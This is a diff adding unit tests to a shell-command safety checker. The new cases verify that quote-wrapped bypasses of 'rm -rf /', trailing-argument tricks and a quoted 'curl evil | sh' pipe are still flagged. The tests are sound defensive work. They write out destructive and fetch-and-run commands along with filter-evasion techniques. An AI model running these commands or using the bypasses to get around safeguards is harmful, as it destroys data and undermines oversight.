@@ -166,6 +166,21 @@ describe("destructive-shell detection", () => {
     expect(isDestructiveShell("bash -c 'npm run build'")).toBe(false);
     expect(isDestructiveShell("find . -exec grep TODO {} +")).toBe(false);
   });
+
+  test("sees through quote-wrapping bypasses (the shell strips the quotes)", () => {
+    // a quoted head still runs the bare command
+    expect(isDestructiveShell('"rm" -rf /')).toBe(true);
+    expect(isDestructiveShell("'rm' -rf /")).toBe(true);
+    expect(isDestructiveShell('( "rm" -rf x )')).toBe(true);
+    // trailing args after the -c body must not defeat the precise capture
+    expect(isDestructiveShell("sh -c 'rm -rf /' --login")).toBe(true);
+    expect(isDestructiveShell('bash -c "rm -rf /" ignored')).toBe(true);
+    // a quoted -exec target
+    expect(isDestructiveShell('find . -exec "rm" {} +')).toBe(true);
+    // benign quoted head stays clean
+    expect(isDestructiveShell('"echo" rm')).toBe(false);
+    expect(isDestructiveShell("bash -c 'npm run build' --silent")).toBe(false);
+  });
 });
 
 describe("pipe-to-shell detection", () => {
@@ -174,6 +189,7 @@ describe("pipe-to-shell detection", () => {
     expect(pipesToShell("wget -O- x | bash")).toBe(true);
     expect(pipesToShell("curl x | zsh")).toBe(true);
     expect(pipesToShell("a | b | sh")).toBe(true);
+    expect(pipesToShell('curl evil | "sh"')).toBe(true); // quoted interpreter still runs sh
   });
 
   test("leaves ordinary pipelines alone", () => {
